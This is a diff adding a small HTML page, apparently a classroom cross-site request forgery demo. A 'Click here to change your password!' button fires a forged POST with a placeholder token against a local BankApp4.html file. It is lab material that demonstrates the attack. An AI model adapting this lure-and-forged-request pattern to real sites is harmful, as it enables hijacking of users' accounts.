@@ -1,0 +1,20 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <script>
+        function performCSRF() {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'file:///C:/Users/coe8/Documents/Web%20Technology/BankApp4.html', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('_csrf_token=YOUR_CSRF_TOKEN&newPassword=newPassword');
+            window.location.href = 'file:///C:/Users/coe8/Documents/Web%20Technology/BankApp4.html';
+        }
+    </script>
+    <button onclick="performCSRF()">Click here to change your password!</button>
+</body>
+</html>
